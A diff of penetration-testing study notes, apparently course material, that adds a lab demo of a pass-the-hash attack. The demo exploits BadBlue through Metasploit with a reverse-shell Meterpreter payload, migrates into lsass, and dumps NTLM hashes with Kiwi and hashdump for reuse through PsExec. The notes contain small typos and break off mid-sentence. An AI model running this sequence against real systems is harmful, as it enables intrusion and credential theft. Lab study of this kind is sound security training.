@@ -220,10 +220,48 @@ still in meterpreter session
 # Pass-The-Hash Attacks
 ## Pass-The-Hash
 - Pass-the-hash is an exploitation technique that involves captturing or harversting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
-- We can use multiple tools to facilitate a Pass-The-Hash atack:
+- We can use multiple tools to facilitate a Pass-The-Hash attack:
   - Metasploit PsExec module
   - Crackmapexec
-  - This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining acces via service exploitation
+- This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining acces via service exploitation
 
+## Demo: Pass-The-Hash Attacks
+
+We start with the exploiting the BadBlue service and then we dump the hashes using Kiwi. Then we try to use the hashes to perform a pass-the-hash attack.
+
+`service postgresql start && msf console`
+msf6:`searcg badblue`
+
+msf6:`use 1`
+
+we leave the default payload as windows/meterpreter/reverse_tcp
+
+
+msf6:`set rhosts [target IP]`
+
+
+msf6:`exploit`
+
+meterpreter session successful.
+
+meterpreter:`pgrep lsass`
+
+meterpreter: `migrate [process ID]`
+
+meterpreter: `getuid`
+
+whe should have admin privs.
+
+meterpreter: `load kiwi`
+
+meterpreter: `lsa_dump_sam`
+
+With lsa_dump_sam we want to get the admin ntlm credentials. We get the admin NTLM hash. We can copy that into a txt file.
+
+Now we want to try the first technique with the PSExec metasploit module.
+
+meterpreter: `hashdump`
+
+We also 
 
 
